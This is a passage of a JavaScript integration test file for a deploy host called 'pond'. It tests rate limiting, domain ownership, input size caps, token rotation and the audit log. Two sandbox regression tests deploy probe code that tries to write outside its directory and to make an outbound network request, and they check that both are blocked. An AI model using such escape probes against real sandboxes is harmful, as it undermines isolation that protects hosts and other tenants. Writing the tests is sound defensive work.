        env: { ...process.env, POND_HOST_TOKEN: xToken },
        stdio: ["ignore", "pipe", "pipe"],
        cwd: REPO_ROOT,
      },
    )
  }
  const killHost = (p) => stopProc(p)
  let p1 = spawnHost()
  p1.stdout.on("data", () => {})
  p1.stderr.on("data", () => {})
  try {
    await waitForHealth(xUrl)
    const fs2 = await import("node:fs")
    const sourceFiles = tinySourceFiles()
    for (let i = 0; i < 3; i++) {
      const res = await fetch(`${xUrl}/api/deploys`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ sourceFiles }),
      })
      await res.text().catch(() => "")
      assert.equal(res.status, 201, `attempt ${i + 1} should succeed`)
    }
    // 4th hits the in-process limiter
    const limited = await fetch(`${xUrl}/api/deploys`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ sourceFiles }),
    })
    await limited.text().catch(() => "")
    assert.equal(limited.status, 429, "4th attempt should be rate limited pre-restart")

    // Bounce the host
    await killHost(p1)
    p1 = spawnHost()
    p1.stdout.on("data", () => {})
    p1.stderr.on("data", () => {})
    await waitForHealth(xUrl)

    // After restart, the next attempt from the same IP must still be limited
    // because the prior 3 attempts persisted to the control DB.
    const afterRestart = await fetch(`${xUrl}/api/deploys`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ sourceFiles }),
    })
    await afterRestart.text().catch(() => "")
    assert.equal(afterRestart.status, 429, "rate limit must persist across host restart")
  } finally {
    await killHost(p1)
    if (existsSync(xData)) rmSync(xData, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 })
  }
})

test("sweeper terminates anonymous deploy after grace (via host bounce)", async () => {
  // Start a host, deploy anonymously with 1s grace, wait 2s, bounce host,
  // confirm the worker is NOT running after the bounce (sweep at startup
  // marks it terminated and we skip booting it).
  const tinyData = mkdtempSync(path.join(tmpdir(), "pond-host-sweep-"))
  const tinyToken = randomBytes(16).toString("hex")
  const tinyPort = await pickFreePort()
  const tinyApi = `http://127.0.0.1:${tinyPort}`
  function spawnTiny() {
    return spawn(
      process.execPath,
      [
        CLI_PATH,
        "host",
        "--port",
        String(tinyPort),
        "--host",
        "127.0.0.1",
        "--public-host",
        publicHost,
        "--data-dir",
        tinyData,
      ],
      {
        env: {
          ...process.env,
          POND_HOST_TOKEN: tinyToken,
          POND_ANONYMOUS_CLEANUP_GRACE: "1s",
          POND_ANONYMOUS_CLEANUP_RETENTION: "300s",
        },
        stdio: ["ignore", "pipe", "pipe"],
        cwd: REPO_ROOT,
      },
    )
  }
  let p1 = spawnTiny()
  p1.stdout.on("data", () => {})
  p1.stderr.on("data", () => {})
  try {
    await waitForHealth(tinyApi)
    const fs = await import("node:fs")
    const sourceFiles = tinySourceFiles()
    const res = await fetch(`${tinyApi}/api/deploys`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ sourceFiles }),
    })
    assert.equal(res.status, 201)
    const cb = await res.json()

    // Wait so grace passes.
    await new Promise((r) => setTimeout(r, 2000))

    // Bounce: SIGINT old host, start a new one. Startup runs runSweep() before
    // listening, which marks terminated and skips booting the terminated worker.
    await stopProc(p1)

    const p2 = spawnTiny()
    p2.stdout.on("data", () => {})
    p2.stderr.on("data", () => {})
    p1 = p2
    await waitForHealth(tinyApi)

    // Now the proxy should NOT find a running worker.
    const http = await import("node:http")
    const probe = await new Promise((resolve) => {
      const req = http.request(
        {
          host: "127.0.0.1",
          port: tinyPort,
          method: "GET",
          path: "/api/query/items",
          headers: { host: `${cb.deployId}.${publicHost}:${tinyPort}` },
        },
        (rs) => {
          let data = ""
          rs.on("data", (c) => (data += c))
          rs.on("end", () => resolve({ status: rs.statusCode, body: data }))
        },
      )
      req.on("error", () => resolve({ status: 0 }))
      req.end()
    })
    assert.equal(probe.status, 404, `expected 404 (terminated), got ${probe.status} body=${probe.body}`)
  } finally {
    await stopProc(p1)
    if (existsSync(tinyData)) rmSync(tinyData, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 })
  }
})

test("anonymous-deploys=false → anonymous POST returns 401", async () => {
  const h = await startExtraHost({ extraArgs: ["--anonymous-deploys", "false"] })
  try {
    const fs = await import("node:fs")
    const sourceFiles = tinySourceFiles()
    const res = await fetch(`${h.apiUrl}/api/deploys`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ sourceFiles }),
    })
    assert.equal(res.status, 401)
  } finally {
    await stopExtraHost(h)
  }
})

test(
  "Node 22+ permission model: anonymous worker cannot write outside deploy dir",
  { skip: parseInt(process.versions.node.split(".")[0], 10) < 22 ? "requires Node 22+" : false },
  async () => {
    // Capsule whose mutation tries to write to /tmp/pond-escape-test.
    const escapeFile = path.join(tmpdir(), `pond-escape-${randomBytes(4).toString("hex")}.txt`)
    try {
      const sourceFiles = tinySourceFiles(`import { capsule, mutation, query, string, table } from "pond/server"
import { writeFileSync } from "node:fs"
export default capsule({
  schema: { items: table({ name: string() }) },
  queries: { items: query((ctx) => ctx.db.items.all()) },
  mutations: {
    escape: mutation((ctx, target) => {
      try {
        writeFileSync(target, "x")
        return { ok: true }
      } catch (e) {
        return { ok: false, error: String(e?.code ?? e?.message ?? e) }
      }
    }),
  },
})
`)
      const create = await fetch(`${apiUrl}/api/deploys`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ sourceFiles }),
      })
      assert.equal(create.status, 201)
      const cb = await create.json()

      const http = await import("node:http")
      const result = await new Promise((resolve, reject) => {
        const payload = JSON.stringify({ args: [escapeFile] })
        const req = http.request(
          {
            host: "127.0.0.1",
            port,
            method: "POST",
            path: "/api/mutation/escape",
            headers: {
              host: `${cb.deployId}.${publicHost}:${port}`,
              "content-type": "application/json",
              "content-length": Buffer.byteLength(payload),
            },
          },
          (rs) => {
            let data = ""
            rs.on("data", (c) => (data += c))
            rs.on("end", () => resolve({ status: rs.statusCode, body: data }))
          },
        )
        req.on("error", reject)
        req.write(payload)
        req.end()
      })
      // Either mutation reports ok:false with ERR_ACCESS_DENIED, or the file was never created.
      const exists = existsSync(escapeFile)
      assert.equal(exists, false, `escape file should not exist: ${escapeFile} body=${result.body}`)
    } finally {
      if (existsSync(escapeFile)) rmSync(escapeFile, { force: true })
    }
  },
)

async function createOwnedDeploy() {
  const fs = await import("node:fs")
  const sourceFiles = tinySourceFiles()
  const res = await fetch(`${apiUrl}/api/deploys`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
    body: JSON.stringify({ sourceFiles }),
  })
  assert.equal(res.status, 201)
  return await res.json()
}

let domainDeployId = ""
test("domains add succeeds for owner with valid subdomain", async () => {
  const d = await createOwnedDeploy()
  domainDeployId = d.deployId
  const res = await fetch(`${apiUrl}/api/domains`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
    body: JSON.stringify({ subdomain: "my-app", deployId: domainDeployId }),
  })
  assert.equal(res.status, 201)
  const body = await res.json()
  assert.equal(body.subdomain, "my-app")
  assert.equal(body.deployId, domainDeployId)
  assert.ok(typeof body.url === "string" && body.url.includes("my-app."))
})

test("domains add rejects reserved subdomain (api)", async () => {
  const res = await fetch(`${apiUrl}/api/domains`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
    body: JSON.stringify({ subdomain: "api", deployId: domainDeployId }),
  })
  assert.equal(res.status, 400)
})

test("domains add rejects 16-char hex subdomain (collides with deployId routing)", async () => {
  const res = await fetch(`${apiUrl}/api/domains`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
    body: JSON.stringify({ subdomain: "abcdef1234567890", deployId: domainDeployId }),
  })
  assert.equal(res.status, 400)
})

test("domains add allows short hex string (under deployId length) and it routes via custom_domains", async () => {
  const http = await import("node:http")
  // 'abcdef12' is 8 hex chars — used to be blocked by the {8,} regex.
  // Now it should be allowed AND route correctly through the proxy (B6 regression).
  const add = await fetch(`${apiUrl}/api/domains`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
    body: JSON.stringify({ subdomain: "abcdef12", deployId: domainDeployId }),
  })
  assert.equal(add.status, 201)
  const routed = await new Promise((resolve, reject) => {
    const req = http.request(
      {
        host: "127.0.0.1",
        port,
        method: "GET",
        path: "/api/query/items",
        headers: { host: `abcdef12.${publicHost}:${port}` },
      },
      (res) => resolve({ status: res.statusCode }),
    )
    req.on("error", reject)
    req.end()
  })
  assert.equal(routed.status, 200)
  // Clean up
  await fetch(`${apiUrl}/api/domains/abcdef12`, {
    method: "DELETE",
    headers: { authorization: `Bearer ${adminToken}` },
  })
})

test("domains add rejects invalid characters (underscore, uppercase, too long)", async () => {
  for (const bad of ["bad_name", "UPPER", "a".repeat(64), "-leading", "trailing-", ""]) {
    const res = await fetch(`${apiUrl}/api/domains`, {
      method: "POST",
      headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
      body: JSON.stringify({ subdomain: bad, deployId: domainDeployId }),
    })
    assert.equal(res.status, 400, `expected 400 for ${JSON.stringify(bad)}, got ${res.status}`)
  }
})

test("domains add 409 on duplicate", async () => {
  const res = await fetch(`${apiUrl}/api/domains`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
    body: JSON.stringify({ subdomain: "my-app", deployId: domainDeployId }),
  })
  assert.equal(res.status, 409)
})

test("custom subdomain routes to the right deploy via proxy", async () => {
  const http = await import("node:http")
  const result = await new Promise((resolve, reject) => {
    const req = http.request(
      {
        host: "127.0.0.1",
        port,
        method: "GET",
        path: "/api/query/items",
        headers: { host: `my-app.${publicHost}:${port}` },
      },
      (res) => {
        let data = ""
        res.on("data", (c) => (data += c))
        res.on("end", () => resolve({ status: res.statusCode, body: data }))
      },
    )
    req.on("error", reject)
    req.end()
  })
  assert.equal(result.status, 200)
  assert.ok(Array.isArray(JSON.parse(result.body)))
})

test("domains list filters by ownership", async () => {
  // Create a non-admin user and a deploy owned by them with a domain.
  const u = await fetch(`${apiUrl}/api/users`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${hostToken}` },
    body: JSON.stringify({ username: "carol" }),
  })
  assert.equal(u.status, 201)
  const carol = await u.json()

  const fs = await import("node:fs")
  const sourceFiles = tinySourceFiles()
  const dep = await fetch(`${apiUrl}/api/deploys`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${carol.token}` },
    body: JSON.stringify({ sourceFiles }),
  })
  assert.equal(dep.status, 201)
  const carolDeploy = await dep.json()

  const add = await fetch(`${apiUrl}/api/domains`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${carol.token}` },
    body: JSON.stringify({ subdomain: "carols-app", deployId: carolDeploy.deployId }),
  })
  assert.equal(add.status, 201)

  const carolList = await fetch(`${apiUrl}/api/domains`, {
    headers: { authorization: `Bearer ${carol.token}` },
  })
  const carolBody = await carolList.json()
  assert.equal(carolBody.domains.length, 1)
  assert.equal(carolBody.domains[0].subdomain, "carols-app")

  const adminList = await fetch(`${apiUrl}/api/domains`, {
    headers: { authorization: `Bearer ${adminToken}` },
  })
  const adminBody = await adminList.json()
  const subs = adminBody.domains.map((d) => d.subdomain).sort()
  assert.ok(subs.includes("my-app"))
  assert.ok(subs.includes("carols-app"))
})

test("non-owner cannot add a domain for someone else's deploy → 403", async () => {
  // carol exists from previous test; try to add a domain pointing to admin's deploy.
  const u = await fetch(`${apiUrl}/api/users`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${hostToken}` },
    body: JSON.stringify({ username: "dave" }),
  })
  assert.equal(u.status, 201)
  const dave = await u.json()
  const res = await fetch(`${apiUrl}/api/domains`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${dave.token}` },
    body: JSON.stringify({ subdomain: "stealing", deployId: domainDeployId }),
  })
  assert.equal(res.status, 403)
})

test("domains remove succeeds for owner", async () => {
  const res = await fetch(`${apiUrl}/api/domains/my-app`, {
    method: "DELETE",
    headers: { authorization: `Bearer ${adminToken}` },
  })
  assert.equal(res.status, 200)
  // Routing should now miss
  const http = await import("node:http")
  const result = await new Promise((resolve, reject) => {
    const req = http.request(
      {
        host: "127.0.0.1",
        port,
        method: "GET",
        path: "/api/query/items",
        headers: { host: `my-app.${publicHost}:${port}` },
      },
      (res2) => {
        let data = ""
        res2.on("data", (c) => (data += c))
        res2.on("end", () => resolve({ status: res2.statusCode, body: data }))
      },
    )
    req.on("error", reject)
    req.end()
  })
  assert.equal(result.status, 404)
})

test("deleting the deploy cascades — its domains are gone", async () => {
  // Re-add a domain on domainDeployId then delete the deploy.
  const add = await fetch(`${apiUrl}/api/domains`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
    body: JSON.stringify({ subdomain: "doomed", deployId: domainDeployId }),
  })
  assert.equal(add.status, 201)
  const del = await fetch(`${apiUrl}/api/deploys/${domainDeployId}`, {
    method: "DELETE",
    headers: { authorization: `Bearer ${adminToken}` },
  })
  assert.equal(del.status, 200)
  // Now the subdomain should not be findable — re-adding the same name for a new deploy must succeed.
  const d2 = await createOwnedDeploy()
  const add2 = await fetch(`${apiUrl}/api/domains`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
    body: JSON.stringify({ subdomain: "doomed", deployId: d2.deployId }),
  })
  assert.equal(add2.status, 201)
})

// ---- Red-team round 2 regressions ----

test("malformed JSON on POST /api/deploys → 400 (not 500) [B1]", async () => {
  const res = await fetch(`${apiUrl}/api/deploys`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
    body: "not json",
  })
  assert.equal(res.status, 400)
  const body = await res.json()
  assert.match(body.error, /Invalid JSON/i)
})

test("malformed JSON on PUT /api/deploys/:id → 400 (not 500) [B1]", async () => {
  // Create a fresh deploy because earlier domainDeployId was cascade-deleted.
  const fs2 = await import("node:fs")
  const sourceFiles = tinySourceFiles()
  const create = await fetch(`${apiUrl}/api/deploys`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
    body: JSON.stringify({ sourceFiles }),
  })
  const cb = await create.json()
  const res = await fetch(`${apiUrl}/api/deploys/${cb.deployId}`, {
    method: "PUT",
    headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
    body: "not json",
  })
  assert.equal(res.status, 400)
  // Cleanup
  await fetch(`${apiUrl}/api/deploys/${cb.deployId}`, {
    method: "DELETE",
    headers: { authorization: `Bearer ${adminToken}` },
  })
})

test("PUT /api/deploys/:id/quota with no fields → 400 (not silent 200) [B4]", async () => {
  const fs2 = await import("node:fs")
  const sourceFiles = tinySourceFiles()
  const create = await fetch(`${apiUrl}/api/deploys`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
    body: JSON.stringify({ sourceFiles }),
  })
  const cb = await create.json()
  const res = await fetch(`${apiUrl}/api/deploys/${cb.deployId}/quota`, {
    method: "PUT",
    headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
    body: JSON.stringify({}),
  })
  assert.equal(res.status, 400)
  await fetch(`${apiUrl}/api/deploys/${cb.deployId}`, {
    method: "DELETE",
    headers: { authorization: `Bearer ${adminToken}` },
  })
})

test("per-user domain quota: 51st domain for a non-admin user → 429 [B5]", async () => {
  // Create a non-admin user and a deploy owned by them.
  const userRes = await fetch(`${apiUrl}/api/users`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
    body: JSON.stringify({ username: `quota-${Date.now()}` }),
  })
  const userBody = await userRes.json()
  const userToken = userBody.token
  const fs2 = await import("node:fs")
  const sourceFiles = tinySourceFiles()
  const dRes = await fetch(`${apiUrl}/api/deploys`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${userToken}` },
    body: JSON.stringify({ sourceFiles }),
  })
  const dBody = await dRes.json()
  const did = dBody.deployId
  // Register 50 domains as that user.
  for (let i = 1; i <= 50; i++) {
    const r = await fetch(`${apiUrl}/api/domains`, {
      method: "POST",
      headers: { "content-type": "application/json", authorization: `Bearer ${userToken}` },
      body: JSON.stringify({ subdomain: `qd-${userBody.username}-${i}`, deployId: did }),
    })
    assert.equal(r.status, 201, `expected 201 on domain ${i}, got ${r.status}`)
  }
  // 51st should 429.
  const r51 = await fetch(`${apiUrl}/api/domains`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${userToken}` },
    body: JSON.stringify({ subdomain: `qd-${userBody.username}-51`, deployId: did }),
  })
  assert.equal(r51.status, 429)
  // Cleanup
  await fetch(`${apiUrl}/api/deploys/${did}`, { method: "DELETE", headers: { authorization: `Bearer ${adminToken}` } })
})

test("anonymous worker cannot make outbound https.request [B2]", async () => {
  // Tiny capsule that fires an outbound https.request from an async IIFE on
  // module load. Stays clear of top-level await (esbuild target is es2020).
  const sourceFiles = tinySourceFiles(`import * as https from "node:https"
import { capsule } from "pond/server"
;(async () => {
  const results: string[] = []
  try {
    await new Promise<void>((res, rej) => {
      const req = https.request({host:"1.1.1.1",port:443,method:"GET",path:"/"}, () => res())
      req.on("error", rej)
      req.end()
      setTimeout(()=>rej(new Error("timeout")), 1500)
    })
    results.push("https:OK")
  } catch (e: any) { results.push("https:" + (e.message || e.code)) }
  console.error("B2RESULT:" + JSON.stringify(results))
})()
export default capsule({ schema: {}, queries: {}, mutations: {} })
`)

  // Spin a host with rate limit high enough.
  const h = await startExtraHost({ extraArgs: ["--anonymous-rate-per-hour", "100"] })
  try {
    // Capture stderr from the extra host to read B2RESULT.
    let stderrBuf = ""
    h.proc.stderr.on("data", (c) => (stderrBuf += c.toString()))
    const res = await fetch(`${h.apiUrl}/api/deploys`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ sourceFiles }),
    })
    assert.equal(res.status, 201)
    // Wait for the worker to boot + run the import.
    await new Promise((r) => setTimeout(r, 1500))
    const match = stderrBuf.match(/B2RESULT:(\[.*?\])/)
    assert.ok(match, `expected B2RESULT in worker stderr, got: ${stderrBuf.slice(-500)}`)
    const result = JSON.parse(match[1])
    assert.equal(result.length, 1)
    assert.match(result[0], /^https:/)
    // Must be denied, not connected.
    assert.notEqual(result[0], "https:OK", "outbound https should have been blocked")
    assert.match(result[0], /Outbound network access disabled/, `expected denial message, got: ${result[0]}`)
  } finally {
    await stopExtraHost(h)
  }
})

// ---- Schema identifier validation ----

test("capsule with SQLite reserved words as table/column names boots and serves queries", async () => {
  const sourceFiles = tinySourceFiles(`import { capsule, query, string, table } from "pond/server"
export default capsule({
  schema: { "select": table({ "order": string() }) },
  queries: { items: query((ctx) => ctx.db["select"].orderBy("order", "asc").all()) },
  mutations: {},
})
`)
  const res = await fetch(`${apiUrl}/api/deploys`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
    body: JSON.stringify({ sourceFiles }),
  })
  // Reserved words are quoted in generated SQL, so boot succeeds.
  assert.equal(res.status, 201)
  const { deployId: rwDeployId } = await res.json()

  // Query the reserved-word table via its subdomain — exercises quoted CREATE/SELECT/ORDER BY.
  const http = await import("node:http")
  const result = await new Promise((resolve, reject) => {
    const req = http.request(
      {
        host: "127.0.0.1",
        port,
        method: "GET",
        path: "/api/query/items",
        headers: { host: `${rwDeployId}.${publicHost}:${port}` },
      },
      (r) => {
        let data = ""
        r.on("data", (c) => (data += c))
        r.on("end", () => resolve({ status: r.statusCode, body: data }))
      },
    )
    req.on("error", reject)
    req.end()
  })
  assert.equal(result.status, 200)
  assert.ok(Array.isArray(JSON.parse(result.body)))
})

test("capsule with _pond_ prefixed table name fails to boot", async () => {
  const sourceFiles = tinySourceFiles(`import { capsule, query, string, table } from "pond/server"
export default capsule({
  schema: { _pond_secret: table({ name: string() }) },
  queries: { items: query((ctx) => ctx.db._pond_secret.all()) },
  mutations: {},
})
`)
  const res = await fetch(`${apiUrl}/api/deploys`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
    body: JSON.stringify({ sourceFiles }),
  })
  assert.equal(res.status, 500)
})

// ---- envText size caps ----

test("PUT /api/deploys/:id rejects envText > 64KB with 413", async () => {
  const fs2 = await import("node:fs")
  const sourceFiles = tinySourceFiles()
  const create = await fetch(`${apiUrl}/api/deploys`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
    body: JSON.stringify({ sourceFiles }),
  })
  assert.equal(create.status, 201)
  const cb = await create.json()
  try {
    // 65 KB envText, well over the 64 KB cap
    const envText = `FOO=${"x".repeat(65 * 1024)}\n`
    const res = await fetch(`${apiUrl}/api/deploys/${cb.deployId}`, {
      method: "PUT",
      headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
      body: JSON.stringify({ sourceFiles, envText }),
    })
    assert.equal(res.status, 413)
    const body = await res.json()
    assert.match(body.error, /envText exceeds/)
  } finally {
    await fetch(`${apiUrl}/api/deploys/${cb.deployId}`, {
      method: "DELETE",
      headers: { authorization: `Bearer ${adminToken}` },
    })
  }
})

test("PUT /api/deploys/:id/env rejects a single value > 1024 chars with 413", async () => {
  const fs2 = await import("node:fs")
  const sourceFiles = tinySourceFiles()
  const create = await fetch(`${apiUrl}/api/deploys`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
    body: JSON.stringify({ sourceFiles }),
  })
  const cb = await create.json()
  try {
    const res = await fetch(`${apiUrl}/api/deploys/${cb.deployId}/env`, {
      method: "PUT",
      headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
      body: JSON.stringify({ entries: { BIG: "y".repeat(1025) } }),
    })
    assert.equal(res.status, 413)
    const body = await res.json()
    assert.match(body.error, /exceeds 1024 chars/)
  } finally {
    await fetch(`${apiUrl}/api/deploys/${cb.deployId}`, {
      method: "DELETE",
      headers: { authorization: `Bearer ${adminToken}` },
    })
  }
})

test("POST /api/deploys/:id/claim rejects oversize envText with 413", async () => {
  const fs2 = await import("node:fs")
  const sourceFiles = tinySourceFiles()
  const create = await fetch(`${apiUrl}/api/deploys`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ sourceFiles }),
  })
  assert.equal(create.status, 201)
  const cb = await create.json()
  try {
    const envText = `FOO=${"x".repeat(65 * 1024)}\n`
    const res = await fetch(`${apiUrl}/api/deploys/${cb.deployId}/claim`, {
      method: "POST",
      headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
      body: JSON.stringify({ claimToken: cb.claimToken, envText }),
    })
    assert.equal(res.status, 413)
  } finally {
    await fetch(`${apiUrl}/api/deploys/${cb.deployId}`, {
      method: "DELETE",
      headers: { authorization: `Bearer ${adminToken}` },
    })
  }
})

// ---- Token rotation grace window ----

test("rotate-token: previous token honored within 5min grace, then rejected", async () => {
  // Create a fresh user we can rotate without affecting other tests.
  const userRes = await fetch(`${apiUrl}/api/users`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${hostToken}` },
    body: JSON.stringify({ username: `rotater-${Date.now()}` }),
  })
  assert.equal(userRes.status, 201)
  const u = await userRes.json()
  const oldToken = u.token

  // Old token works.
  const before = await fetch(`${apiUrl}/api/users/me`, {
    headers: { authorization: `Bearer ${oldToken}` },
  })
  assert.equal(before.status, 200)

  // Rotate.
  const rotateRes = await fetch(`${apiUrl}/api/users/me/rotate-token`, {
    method: "POST",
    headers: { authorization: `Bearer ${oldToken}` },
  })
  assert.equal(rotateRes.status, 200)
  const rotated = await rotateRes.json()
  const newToken = rotated.token
  assert.ok(newToken && newToken !== oldToken)

  // New token works immediately.
  const withNew = await fetch(`${apiUrl}/api/users/me`, {
    headers: { authorization: `Bearer ${newToken}` },
  })
  assert.equal(withNew.status, 200)

  // Old token still works within grace.
  const withOldGrace = await fetch(`${apiUrl}/api/users/me`, {
    headers: { authorization: `Bearer ${oldToken}` },
  })
  assert.equal(withOldGrace.status, 200, "old token should still work within grace window")

  // Simulate grace expiry by reaching into the control DB and setting
  // previousTokenExpiresAt to a past timestamp.
  const Database = (await import("better-sqlite3")).default
  const db = new Database(path.join(dataDir, "control.db"))
  db.prepare("UPDATE users SET previousTokenExpiresAt = ? WHERE id = ?").run(
    new Date(Date.now() - 1000).toISOString(),
    u.userId,
  )
  db.close()

  // Now the old token should be rejected.
  const expired = await fetch(`${apiUrl}/api/users/me`, {
    headers: { authorization: `Bearer ${oldToken}` },
  })
  assert.equal(expired.status, 401, "old token must be rejected after grace expires")

  // New token still works.
  const stillNew = await fetch(`${apiUrl}/api/users/me`, {
    headers: { authorization: `Bearer ${newToken}` },
  })
  assert.equal(stillNew.status, 200)
})

// ---- Audit log ----

test("audit log records deploy.create and is admin-only", async () => {
  const fs2 = await import("node:fs")
  const sourceFiles = tinySourceFiles()
  const create = await fetch(`${apiUrl}/api/deploys`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
    body: JSON.stringify({ sourceFiles }),
  })
  assert.equal(create.status, 201)
  const cb = await create.json()

  // Unauthenticated → 401
  const unauth = await fetch(`${apiUrl}/api/audit`)
  assert.equal(unauth.status, 401)

  // Non-admin token → 403
  const userRes = await fetch(`${apiUrl}/api/users`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${hostToken}` },
    body: JSON.stringify({ username: `audit-viewer-${Date.now()}` }),
  })
  const userBody = await userRes.json()
  const forbidden = await fetch(`${apiUrl}/api/audit`, {
    headers: { authorization: `Bearer ${userBody.token}` },
  })
  assert.equal(forbidden.status, 403)

  // Admin → 200 with the just-created deploy in the log
  const ok = await fetch(`${apiUrl}/api/audit?limit=20`, {
    headers: { authorization: `Bearer ${adminToken}` },
  })
  assert.equal(ok.status, 200)
  const body = await ok.json()
  assert.ok(Array.isArray(body.entries))
  const creation = body.entries.find((e) => e.action === "deploy.create" && e.targetDeployId === cb.deployId)
  assert.ok(
    creation,
    `expected deploy.create entry for ${cb.deployId}, got ${JSON.stringify(body.entries.slice(0, 5))}`,
  )
  assert.equal(typeof creation.ts, "string")
  assert.ok(creation.metadata && typeof creation.metadata.bundleBytes === "number")

  // Cleanup
  await fetch(`${apiUrl}/api/deploys/${cb.deployId}`, {
    method: "DELETE",
    headers: { authorization: `Bearer ${adminToken}` },
  })
})

test("audit log records anonymous deploy.create with __anonymous__ actor", async () => {
  const h = await startExtraHost({ extraArgs: ["--anonymous-rate-per-hour", "10"] })
  try {
    const fs2 = await import("node:fs")
    const sourceFiles = tinySourceFiles()
    // Bootstrap an admin on this host first so we can read the audit log.
    const bootstrap = await fetch(`${h.apiUrl}/api/users`, {
      method: "POST",
      headers: { "content-type": "application/json", authorization: `Bearer ${h.hostToken}` },
      body: JSON.stringify({ username: "audit-admin" }),
    })
    const ba = await bootstrap.json()

    const dep = await fetch(`${h.apiUrl}/api/deploys`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ sourceFiles }),
    })
    assert.equal(dep.status, 201)
    const cb = await dep.json()

    const auditRes = await fetch(`${h.apiUrl}/api/audit`, {
      headers: { authorization: `Bearer ${ba.token}` },
    })
    assert.equal(auditRes.status, 200)
    const body = await auditRes.json()
    const entry = body.entries.find((e) => e.action === "deploy.create" && e.targetDeployId === cb.deployId)
    assert.ok(entry, "expected anon deploy.create audit entry")
    assert.equal(entry.actor, "__anonymous__")
    assert.equal(entry.metadata?.anonymous, true)
  } finally {
    await stopExtraHost(h)
  }
})

test(
  "pond deploy writes .pond/deploy.json with mode 0600 (hosted path)",
  { skip: process.platform === "win32" ? "POSIX modes only" : false },
  async () => {
    // Stage a capsule project in a tmpdir, then invoke the CLI to deploy
    // anonymously against the running test host.
    const projDir = mkdtempSync(path.join(tmpdir(), "pond-deploy-perm-"))
    const { mkdirSync, writeFileSync } = await import("node:fs")
    try {
      mkdirSync(path.join(projDir, "server"), { recursive: true })
      writeFileSync(
        path.join(projDir, "server", "index.ts"),
        `import { capsule, query, string, table } from "pond/server"
export default capsule({
  schema: { items: table({ name: string() }) },
  queries: { items: query((ctx) => ctx.db.items.all()) },
  mutations: {},
})
`,
      )
      const { execFile } = await import("node:child_process")
      const { promisify } = await import("node:util")
      const execFileP = promisify(execFile)
      await execFileP(process.execPath, [CLI_PATH, "deploy", "--api", apiUrl], {
        cwd: projDir,
        env: { ...process.env },
        timeout: 30000,
      })
      const deployFile = path.join(projDir, ".pond", "deploy.json")
      const { statSync, readFileSync } = await import("node:fs")
      const st = statSync(deployFile)
      // POSIX mode lower 9 bits — we want 0600 (rw-------). Windows doesn't
      // implement POSIX permission bits, so this property only holds on POSIX.
      if (process.platform !== "win32") {
        assert.equal(st.mode & 0o777, 0o600, `expected 0600, got 0${(st.mode & 0o777).toString(8)}`)
      }
      // sanity: file contains a claimToken
      const body = JSON.parse(readFileSync(deployFile, "utf-8"))
      assert.ok(typeof body.claimToken === "string" && body.claimToken.length >= 32)
      // Cleanup the host-side deploy
      await fetch(`${apiUrl}/api/deploys/${body.deployId}`, {
        method: "DELETE",
        headers: { authorization: `Bearer ${adminToken}` },
      })
    } finally {
      if (existsSync(projDir)) rmSync(projDir, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 })
    }
  },
)

test("WebSocket upgrade proxies through host to deploy", async () => {
  const wsSrc = `import { capsule, socket, string, table } from "pond/server"
export default capsule({
  schema: { x: table({ name: string() }) },
  queries: {},
  mutations: {},
  sockets: {
    echo: socket((ctx, ws) => {
      ws.on("message", (data) => ws.send("echo:" + data))
    }),
  },
})
`
  const created = await fetch(`${apiUrl}/api/deploys`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
    body: JSON.stringify({
      sourceFiles: {
